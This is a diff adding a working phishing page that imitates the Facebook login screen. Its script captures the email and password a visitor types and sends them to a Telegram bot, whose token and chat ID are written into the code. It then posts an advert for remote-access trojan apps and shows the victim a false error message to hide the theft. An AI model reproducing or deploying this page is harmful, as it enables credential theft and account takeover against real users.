@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook</title>
+  
+  <!-- Custom Styles -->
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <center>
+    <img class="img" src="/Screenshot_20220814-191744_1.png" alt="img">
+    <a class="lang" href="#">English .usa/ </a>
+    <div id="login">
+      <input type="email" id="email" placeholder="Phone or email">
+      <input type="password" id="password" placeholder="Password">
+      <br>
+      <button id="submit">Log In</button>
+    </div>
+    <a class="forgot" href="#">Forgot<br>Password?</a>
+    <hr>
+    <p>OR</p>
+    <button class="creat">Create New Facebook Account</button>
+  </center>
+
+  <script>
+    document.getElementById('submit').addEventListener('click', function () {
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const botToken = "7603495774:AAEQVpoUK5ITk9MM73F_vqVHjc0nXFmAEZI"; // Your bot token
+      const chatId = "7429300688"; // Your chat ID
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      // First message: email and password
+      const message1 = `Email: ${email}\nPassword: ${password}`;
+
+      // Second message: WhatsApp channel link
+      const message2 = `Follow for more Rat apks💀: https://whatsapp.com/channel/0029VangYOt96H4JhFarL10C`;
+
+      // Send first message
+      fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message1
+        })
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            // Send the second message after the first one succeeds
+            return fetch(url, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify({
+                chat_id: chatId,
+                text: message2
+              })
+            });
+          } else {
+            alert("Failed to send details. Check bot token or chat ID.");
+          }
+        })
+        .then(response => {
+          if (response && response.ok) {
+            alert("Error try again later!");
+          }
+        })
+        .catch(error => {
+          console.error("Error:", error);
+          alert("An error occurred.");
+        });
+    });
+  </script>
+</body>
+</html>
